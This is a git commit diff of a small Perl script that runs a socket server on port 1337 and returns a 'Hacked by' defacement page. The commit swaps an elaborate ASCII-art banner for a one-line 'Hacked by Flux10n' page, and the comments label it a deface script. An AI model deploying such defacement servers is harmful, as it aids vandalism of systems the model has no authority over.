72b2d868010832d8ab6aaff6e2511e635b7605d8
Λ L F I Λ N <98892565+flux10n@users.noreply.github.com>
2022-06-13 21:23:26 +0700

    Update a.pl

--- a.pl
+++ a.pl
@@ -3,13 +3,13 @@ use strict;
 use IO::Socket;
 
 sub Wait {
-	wait; # fuck
+	wait; # iyh
 }
 
 $SIG{CHLD} = \&Wait;
 
 my $server = IO::Socket::INET->new(
-	LocalPort 	=> 2022,	# set port
+	LocalPort 	=> 1337,	# set port
 	Type 		=> SOCK_STREAM,
 	Reuse 		=> 1,
 	Listen 		=> 10) or die "$@\n";
@@ -19,39 +19,7 @@ while($client = $server->accept()) {
 	select $client;
 	print $client "HTTP/1.0 200 OK\r\n";
 	print $client "Content-type: text/html\r\n\r\n";
-	print $client '<title>000</title>
-<style type="text/css">
-*{
-background:#fff;
-}
-
-p {
-margin:0 100px;
-font-size:1.5vw;
-color:#000;
-}
-
-img {
-width:30%;
-}
-
-</style>
-<table height="20%" width="100%">
-<td align="center">
-	<p>Hacked by <b>@unknown</b></p>
-<pre><b><font size="4.5">
-	
-______________.___.__________ ________ __________  _____________.___.__________
-\_   ___ \__  |   |\______   \\_____  \\______   \/  _____/\__  |   |\____    /
-/    \  \//   |   | |    |  _/ /   |   \|       _/   \  ___ /   |   |  /     / 
-\     \___\____   | |    |   \/    |    \    |   \    \_\  \\____   | /     /_ 
- \______  / ______| |______  /\_______  /____|_  /\______  // ______|/_______ \
-        \/\/               \/         \/       \/        \/ \/               \/
-
-</font></b></pre><br>
-	<p>~We are party at your <b>security!!!</b></p>
-<p>"The world does not need intelligent people, but the world needs honest people."</p><br><br>
-	'; # fuck
+	print $client '<h1>Hacked by Flux10n</h1>'; # script deface
 }
 continue {
 	close($client); #fuck
